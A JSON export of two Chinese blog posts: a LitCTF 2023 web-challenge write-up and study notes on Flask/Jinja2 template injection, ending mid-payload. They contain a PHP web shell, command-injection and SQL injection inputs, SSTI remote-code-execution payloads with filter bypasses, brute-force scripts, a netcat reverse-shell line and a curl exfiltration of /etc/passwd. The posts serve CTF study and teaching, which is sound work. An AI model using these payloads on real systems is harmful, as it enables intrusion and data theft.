[{"id":"a1d695094e9aa3c3a7c4f837b1ce6fd6","title":"web[LitCTF2023] 郑州轻工业大学首届网络安全赛wp","content":"1.我Flag呢？\n2.导弹迷踪\n3.Follow me and hack me\n4.Ping前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）并将抓到的包进行我们需要的修改，”127.0.0.1|ls”，执行ls命令,可以执行,发现flag文件,直接cat，就可以读取\n5.PHP是世界上最好的语言！！题目提示flag位于根目录，直接去根目录找就行，然后直接cat就能拿到flag\n6.作业管理系统查看页面源代码，提示默认账户admin admin，登录进入作业管理系统，发现上传文件的功能，猜测存在文件上传漏洞，上传php一句话木马，\n&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;\n使用蚁剑连接，访问上传木马1.php，连接成功，发现根目录下存在flag文件，读取flag文件得到flag\n7.Vim yyds访问xxx&#x2F;.index.php.swp下载泄露的备份文件整理后的代码如下：\n&lt;?php\nerror_reporting(0);             \n$password &#x3D; &quot;Give_Me_Your_Flag&quot;;             \necho &quot;&lt;p&gt;can can need Vim &lt;&#x2F;p&gt;&quot;;             \n&#123;             \nif ($_POST[&#39;password&#39;] &#x3D;&#x3D;&#x3D; base64_encode($password)) \necho &quot;&lt;p&gt;Oh You got my password!&lt;&#x2F;p&gt;&quot;;             \neval(system($_POST[&#39;cmd&#39;]));                 \n&#125;                 \n?&gt;             \n按照要求post提交password和cmd，在根目录发现flag\n8.这是什么？SQL ！注一下 ！1)))))) or 1&#x3D;1#\n\n然后,恭喜你，就得到了一个假的flag。\n1)))))) order by 2 #\n\n输入3返回值为0，\n1)))))) union select 1,group_concat(schema_name) from information_schema.schemata#\n爆库：information_schema,mysql,ctftraining,performance_schema,test,ctf\n1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;ctftraining&quot;#\n爆表：flag,news,users\n1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;flag&quot;#\n爆列名：flag\n1)))))) union select 1,group_concat(flag) from ctftraining.flag#\n\n9.Http pro max plus\n可恶，加了个xff。被嘲讽了。不过没关系，还有很多办法。\nclient-ip: 127.0.0.1\n\n\nemmm，也许还有更简单粗暴的方法，但是。\nReferer:pornhub.com\n\n\nUser-Agent: Chrome\n\n\n代理的请求头：\n\nHTTP请求头大全,HTTP头信息包括通用头、请求头、响应头和实体头四个部分：https://stackoverflow.org.cn/httpheader/\nvia: Clash.win\n\n\n\n三个链接我帮大家都看过了，没有好康的，但是拿到flag就不亏。\n\n10.1zjs\n是f1ag，不是flag，慢慢找吧，js代码有点多。然后访问&#x2F;&#x66;&#64;&#107;&#x33;&#102;&#x31;&#97;&#103;&#46;&#x70;&#x68;&#x70;，把代码全部复制到控制台回车。js fuck：\n11.就当无事发生社工题，给了链接 https://ProbiusOfficial.github.io ，打开后发现是探姬的博客，翻到最底下hexo，搭建过博客就想到github（唔，加上背景图片博客很好看，但是我截图的时候图片没加载出来）\n\n利用github搭建的hexo博客有固定格式：https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/\n\n历史记录有删掉的版本，不出意外就在这里面就有flag。\n\n12.Flag点击就送！flask-session-cookie-manager工具下载：https://github.com/noraj/flask-session-cookie-manager\nusage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s &lt;string&gt;, --secret-key &lt;string&gt;\n                        Secret key\n  -t &lt;string&gt;, --cookie-structure &lt;string&gt;\n                        Session cookie structure\n\n\n13.彩蛋彩蛋分布于  Follow me and hack me  作业管理系统 狠狠的注入 四个题目 中\n\n1.我Flag呢:在script.min.js可以找到。\n\nLitCTF&#123;First_t0_The_k3y! (1&#x2F;?) \n\n2.作业管理系统：\n_S0_ne3t? (2&#x2F;?)\n\n3.Follow me and hack me:\n提示说有备份文件很好吃。\n备份文件常见的后缀名:\n.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n常见的网站源码备份文件名：\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp\n\nwww.zip，手动尝试吧，脚本没跑出来，全是200。\n\n_R3ady_Pl4yer_000ne_ (3&#x2F;?)\n\n4.狠狠的注入:\nF1rst_to_Th3_eggggggggg!&#125; (4&#x2F;4)\n\nall.四个合在一起得到彩蛋的完整flag：\nNSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;","slug":"Litctf 2023","date":"2023-05-16T15:45:17.000Z","categories_index":"文章","tags_index":"LitCTF,wp","author_index":"南瓜の无名"},{"id":"3137c2b6b2ca0e39e8c62639d966b498","title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","content":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统\n漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互\nflask是基于python开发的一种web框架，那么也就意味着如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval，system，file等等之类的函数。\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123; &#123;str&#125; &#125;&lt;&#x2F;body&gt;        \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;\n    #str是被&#123; &#123;&#125; &#125;包括起来的，会被预先渲染转义，然后才会输出，不会被渲染执行；\n    return render_template_string(html_str,str&#x3D;str)\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;不会执行\n\nfrom importlib.resources import contents\nimport time\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)       #&#123;&#125;里面可以定义任何参数\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123;0&#125;&lt;&#x2F;body&gt;    \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;.format(str)     #str值通过format()函数填充到body中间\n    return render_template_string(html_str)\n    #return render_template_string会把&#123;&#125;内的字符串当成代码指令\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;会被当成指令执行 \n\n可以利用魔术方法去验证模板注入\n127.0.0.1:8888&#x2F;?a&#x3D;&#123; &#123;&quot;.__class__.__mro__&#125; &#125;\n\n服务器端模板注入实际上也是一种注入漏洞。\n判断模板类型$&#123;7*7&#125;成功：\na&#123;*comment*&#125;b           输出ab -&gt; Smarty\n$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;       输出azb -&gt; Mako or ???\n\n$&#123;7*7&#125;失败：\n&#123; &#123;7*7&#125; &#125; and &#123; &#123;7*&#39;7&#125;&#39;&#125;   输出49 -&gt; Jinja2 or Twig or ???\n\nssti常用注入模板1.文件读取2.内建函数eval执行命令3.os模块执行命令4.importlib类执行命令5.linecache函数执行命令6.subprocess.Popen类执行命令\n1.文件读取#查找子类 _frozen_importlib_external.FileLoader\n&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;\n#FileLoader的利用\n&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[79][&quot;get_data&quot;](0,&quot;&#x2F;etc&#x2F;passed&quot;)&#125; &#125;\n#读取配置文件下的FLAG\n&#123; &#123;config&#125; &#125;\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n\n~python脚本编写(POST提交”name”的值，通过for循环查找所需字符串)\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500)\n    data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    #data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__mro__[1].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib_external.FileLoader&#39; in response.text:\n                print(i)\n    except:\n        pass \n\n2.内建函数eval执行命令内建函数：python在执行脚本时自动加载的模块\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500):\n    data&#x3D;&#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#39;__builtins__&#39;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;eval&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat .&#x2F;etc&#x2F;passwd&quot;).read()&#39;)&#125; &#125;\n\n__builtins__提供对python的所有”内置“标识符的直接访问\neval()计算字符串表达式的值\n__import__加载os模块\npopen()执行一个shell以运行命令来开启一个进程，执行cat &#x2F;etc&#x2F;passwd\n(system没有回显)\n\n3.os模块执行命令~~在其他函数中直接调用os模块\n#通过config，调用os\n&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125; &#125;\n\n#通过url_for，调用os\n&#123; &#123;url_for.__globals__.os.popen(&#39;whoami&#39;).read()&#125; &#125;\n\n~~在已经加载好os模块的子类里直接调用os模块\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#39;os&#39;].popen(&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n&quot;&quot;&quot;\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__bases__[0] 返回 str 基类对象。\nstr.__bases__[0].__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[199] 表示选择该列表中的第 200 个子类，因为在 Python 中，许多内置或库（如 os、sys 等）都是基于类实现的，而拥有相同父类的类按照继承顺序排序在该列表中。\n.__init__ 返回所选子类的初始化方法。\n.__globals__[&#39;os&#39;] 返回一个包含 os 模块的全局命名空间字典。\n.popen(&quot;ls -l &#x2F;opt&quot;) 在该全局命名空间中调用 popen() 方法，并执行一个列出位于 &#x2F;opt 目录下的所有文件的命令。\n.read() 读取命令所输出的数据并返回给模板。\n&quot;&quot;&quot;\n\n其他一些payload的举例\n&#123; &#123;self.__dict__._TemplateReference__context.keys()&#125; &#125;\n&#123; &#123;lipsum.__globals__.os.popen(&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n\n__base__和__bases__[ ]的区别\n__base__ 属性只能获取单一的父类，而 __bases__[] 属性可以获取到所有的直接父类。\n\n4.importlib类执行命令可以加载第三方库，使用load_module加载ospython脚本查找_frozen_importlib.BuiltinImporter\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib.BuiltinImporter&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n\n5.linecache函数执行命令linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用linecache函数如执行命令。python脚本查找linecache\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;linecache&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n\n6.subprocess.Popen类执行命令从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。subprocess意在替代其他几个老的模块或者函数，比如：os.system,os.popen等函数。python脚本查找subprocess.Popen:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;subprocess.Popen&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125; &#125;\n&quot;&quot;&quot;\n[] 创建一个空列表。\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__base__ 返回 str 基类对象。\nstr.__base__.__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[200] 表示选择该列表中的第 201 个子类，因为在 Python 中，许多内置或到处的库（如 os、sys 等）都是基于类实现的，并且继承关系可能会随着版本更新而变化。\n调用所选类的初始化方法，并传递给它要执行的系统命令和参数。请注意，这里将参数传递给 shell&#x3D;True 会让命令在 shell 环境下运行，这可以使用户更容易地传递一些组合命令。\ncommunicate() 方法发起与执行命令的子进程的双向通信，并等待命令完成。我们调用此方法以获取命令输出和错误结果。\ncommunicate()[0] 返回命令输出，因为在这个例子中无需关心可能存在的错误结果。\nstrip() 去除输出的最前面之后的空白字符。\n&quot;&quot;&quot;\n\n总结\n绕过过滤1.绕过过滤双大括号{ % % }是属于flask的控制语句，且以{ % end… % }结尾，可以通过在控制语句定义变量或者写循环，判断。示例app.py:\nfrom flask import Flask,rendre_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef show1():\n    girls &#x3D; [&#39;小红&#39;,&#39;小蓝&#39;，&#39;小粉&#39;,&#39;小黄&#39;,&#39;小绿&#39;]\n    return render_template(&#39;index.html&#39;,girls&#x3D;girls)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n示例index.html:\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Document&lt;&#x2F;title&gt;\n    &lt;style&gt;\n            .a&#123;\n                color:red;\n                font_weight:bold;\n            &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;ul&gt;\n    &#123; % for girl in girls % &#125;\n        &#123; % if girl|length &gt;&#x3D;3 % &#125;\n            &lt;li class&#x3D;&quot;a&quot;&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % else % &#125;\n            &lt;li&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % endif % &#125;\n    &#123; % endfor % &#125;\n&lt;&#x2F;ul&gt;\n&#123; % set name&#x3D;&#39;a&#39; % &#125;\n&#123; &#123;name&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n解题思路\n#判断&#123; &#123;&#125; &#125;被过滤\n#尝试&#123; % % &#125;\n&#123; % if 2&gt;1 % &#125;name&#123; % endif % &#125;\n&#123; % if &#39;&#39;.__class__ % &#125;name&#123; % endif % &#125;\n#有回显name说明&#39;&#39;.__class__有内容\n&#123; % if &quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;\n#如果有回显name则说明命令正常执行\n构造脚本查询可使用“popen”的子类编号\nimport requests\nurl &#x3D; input(&quot; 请输入url链接 &quot;)\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; % if &quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &quot;name&quot; in response.text:\n                print(i,&quot;--&gt;&quot;,data)  \n                break\n    except:\n        pass\n\npayload：\n&#123; % print(&quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read()) % &#125;\n\n2.无回显ssti模板注入~ ssti盲注思路：\n(1)反弹shell\n通过rce反弹一个shell出来绕过\n(2)带外注入\n通过requestbin或dnslog的方法将信息传到外界\n(3)纯盲注\n\n反弹shell（没有回显，直接使用脚本批量执行希望执行的命令）\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 监听主机 端口 -e &#x2F;bin&#x2F;bash&quot;).read()&#125; &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#监听主机收到反弹shell进入对方命令行界面\n\n带外注入此处使用wget方法来带外想要知道的内容，也可以使用dnslog或者nc。\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;curl http:&#x2F;&#x2F;监听主机ip&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;).read()&#125; &#125;&#39;&#125;            \n        #反引号命令执行\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#同时kali开启一个python http监听  #python3 -m http.server 80\n#cat没办法换行，只能显示第一行（需要配合换行命令来显示其他内容）\n\n纯盲注\n3.getitem绕过中括号过滤__getitem__()是python的一个魔术方法，对字典使用时，传入字符串，返回字典相应键所对应的值；对列表使用时，传入整数，返回列表对应索引的值；\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def getitem(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t.getitem(&#39;2&#39;))\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def __getitem__(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t[&#39;2&#39;])           #实体对象[&#39;key&#39;] 系统会自动调用__getitem__方法\n\n可以用来绕过[]过滤\n&#123; &#123;&#39;&#39;.__ckass__.__base__.__subclasses__().__getitem__(&#39;+ str(i) +&#39;)&#125; &#125;\n\n使用__getitem__()构造payload:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;code&quot;:\n    &#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#39;+str(i)+&#39;)&#125; &#125;&#39;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_wrap_close&#39; in response.text:\n                print(i,&quot;---&gt;&quot;,response.text)\n                break\n    except:\n        pass\npayload:\n&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n\n4.request绕过单双引号过滤request在flask中可以访问基于HTTP请求传递的所有信息此request并非python函数，而是在flask内部的函数\nrequest.args.key    获取get传入的key的值\nrequest.values.x1   所有参数 \nrequest.cookies     获取cookies传入参数 \nrequest.headers     获取请求头请求参数 \nrequest.form.key    获取post传入参数\n（Content-Type：applicaation／x-www-form-urlencoded或multipart／form-data） request.data        获取post传入参数（Content-Type：a／b） \nrequest.json        获取post传入json参数（Content-Type：application／json） \n\napp.py\nfrom flask import Flask, render template, request\n\napp&#x3D;Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;]) \ndef show1():\n    return render_template(&#39;index.html&#39;) \n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run(host&#x3D;&#39;0.0.0.0&#39;) \n\nindex.html\n&lt;html lang&#x3D;&quot;en&quot;&gt; \n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; \n&lt;title&gt;过滤器的使用&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;br&gt;\n获取get提交数据： &#123; &#123;request.args.k1&#125; &#125;\n&lt;br&gt;\n获取post提交数据：&#123; &#123;request.form.k2&#125; &#125;\n&lt;br&gt;\n获取cookie提交数据：&#123; &#123;request.cookies.k3&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n在构造payload时大多会用到单双引号，可以通过构造带 参数的url，配合request获取参数的内容来组成想要提交的指令，从而绕过单双引号的使用。\n#POST提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.k1](requests.form.k2).read()&#125; &#125;&amp;k1&#x3D;popen&amp;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n#cookie提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.k1](request.cookies.k2).read()&#125; &#125;\n#Cookie:k1&#x3D;popen;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n\n5.过滤器绕过下划线过滤过滤器1.过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。2.可以链接到多个过滤器，一个过滤器的输出将应用与下一个过滤器。\napp.pyindex.html\n&#123; &#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)&#125; &#125;\n#attr绕过下划线_过滤\n&#39;&#39;&#39;\n1.使用reques方法\nGET请求：URL&#x2F;?cla&#x3D;__class__\nPOST提交：code&#x3D;&#123; &#123;()|attr(request.args.cla)&#125; &#125;\n&#39;&#39;&#39;\n#&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n#例子：\n#GET提交：URL&#x2F;?cla&#x3D;__class__&amp;bas&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;ini&#x3D;__init__&amp;glo&#x3D;__globals__&amp;gei&#x3D;__getitem__\n#POST提交：&#123; &#123;&#39;&#39;|attr(request.args.cla)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passwd&#39;)|attr(&#39;read&#39;)()&#125; &#125;\n&#39;&#39;&#39;\n2.使用unicode编码\n3.使用16位编码\n4.base64编码\n5.格式化字符串      %c %95即下划线\n&#39;&#39;&#39;\n\n6.中括号绕过点过滤点’.’被过滤1.用中括号代替点2.attr()绕过\n7.绕过关键字过滤过滤了”class””arg””from””value””int””global”等关键字\n以&quot;__class__&quot;为例\n1.字符编码\n2.最简单的拼接“+”：&#39;__cl&#39;+&#39;ass__&#39;\n3.使用Jinjia2中的&quot;~&quot;进行拼接：&#123; %set a&#x3D;&quot;__cla&quot;% &#125;&#123; %set b &#x3D; &quot;ss__&quot;% &#125;&#123; &#123;()[a~b]&#125; &#125;\n4.利用过滤器（reverse反转，replace替换，join拼接等）：\n&#123; %set a&#x3D;&quot;__ssalc__&quot;|reverse% &#125;&#123; &#123;()[a]&#125; &#125;\n5.利用python的char():\n&#123; %set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr% &#125;&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;\n#为了避免字符串被过滤&#x2F;转义，基于chr()函数来生成整数编码的字符，并将其拼接成字符串。例如，在上面的代码中，chr(95)会生成一个下划线字符 &quot;_&quot; 的ASCII编码，chr(99)则对应着 &quot;c&quot; 字符，依次类推。\n\n\n8.length过滤器绕过数字过滤\n9.获取config文件有些flag可能在config文件中如果没有过滤，直接{ {config} }就能打开。&#x2F;&#x2F;姿势集里面有相关说明\n**flask内置函数**\nlipsum 可加载第三方库\nurl_for 可返回url路径\n#url_for:一个可以根据视图函数名或端点名称生成相应 URL 的函数。通过这个函数，我们可以在不硬编码URL的情况下引用不同的视图函数或端点，并构建出正确的URL路由。\nget_flashed_message 可获取消息\n#get_flashed_messages：一个在重定向期间获取Flash消息的函数。Flash消息通常用于在请求之间存储临时信息，比如表单提交后显示一个成功或失败的消息。\n**flask内置对象**\ncycler：一个轻量级的循环迭代器，可以用于生成一系列重复的值。\njoiner：一个字符串连接器，可以将多个字符串连接成一个字符串。\nnamespace：一个命名空间对象，可以在程序中组织变量和函数，避免命名冲突。\nconfig：一个配置管理器对象，可以读取和写入程序的配置文件参数。\nrequest：一个用于发送 HTTP 请求的对象，通常用于从网络上获取数据。\nsession：一个用于存储用户会话信息的对象，通常用于在Web应用程序中跟踪用户状态。\n可利用已加载内置函数或对象寻找被过滤字符串可利用内置函数调用current_app模块进而查看配置文件\ncurrent_app\n调用current_app相当于调用flask\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config&#125; &#125;\n#当在 Flask 模板中调用 &#123; &#123; url_for.__globals__[&#39;current_app&#39;].config &#125; &#125; 时，实际上是通过获取 url_for 对应的全局命名空间中的 current_app 对象，进而获取当前应用程序的配置信息并输出。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125; &#125;\n10.混合过滤dict()和join\ndict(): #用来创建一个字典\njoin： #将一个序列中的参数值拼接成字符串\n&#123; %set a&#x3D;dict(nihao&#x3D;1)% &#125;&#123; &#123;a&#125; &#125;   \n#创建字典a，键名nihao，键值1\n&#123; %set a&#x3D;dict(__cla&#x3D;1,ss__&#x3D;2)|join% &#125;&#123; &#123;a&#125; &#125;  \n#创建字典a，join把参数值拼接成字符串\n获取符号\n利用flask内置函数和对象获取符号\n&#123; % set hao &#x3D; (&#123;&#125;|select()|string()) % &#125;&#123; &#123;hao&#125; &#125;\n&#123; % set hao &#x3D; (lipsum|string) % &#125;&#123; &#123;hao&#125; &#125;\n#获取下划线\n&#123; % set hao &#x3D; (self|string()) % &#125;&#123; &#123;hao&#125; &#125;\n#获取空格\n&#123; % set hao &#x3D; (self|string|urlencode) % &#125;&#123; &#123;hao&#125; &#125;\n#获取百分号\n&#123; % set hao &#x3D; (app.__doc__|string) % &#125;&#123; &#123;hao&#125; &#125;\n···类似的payload有很多\n在后面添加|list,然后根据返回的结果，通过hao[]去获取你需要的符号\n具体可以看示例2里面的payload\n\n示例1：WAF过滤  &#39;,&quot;,&#39;+&#39;,&#39;request&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;\npayload原型:&#123; &#123;().__class__.__base__.__subclasses__()[117]&#125;.__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()&#125;\npayload：\n&#123; %set 